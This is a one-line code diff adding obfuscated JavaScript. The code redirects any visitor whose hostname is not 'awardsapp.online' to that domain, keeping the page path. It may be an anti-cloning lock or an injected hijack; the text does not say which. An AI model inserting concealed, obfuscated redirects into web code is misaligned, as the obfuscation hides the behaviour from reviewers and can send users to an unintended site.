@@ -1,0 +1,1 @@
+var _0x3f2a=["hostname","href","pathname","location","awardsapp.online","https://"];if(window[_0x3f2a[3]][_0x3f2a[0]]!==_0x3f2a[4]){window[_0x3f2a[3]][_0x3f2a[1]]=_0x3f2a[5]+_0x3f2a[4]+window[_0x3f2a[3]][_0x3f2a[2]];}
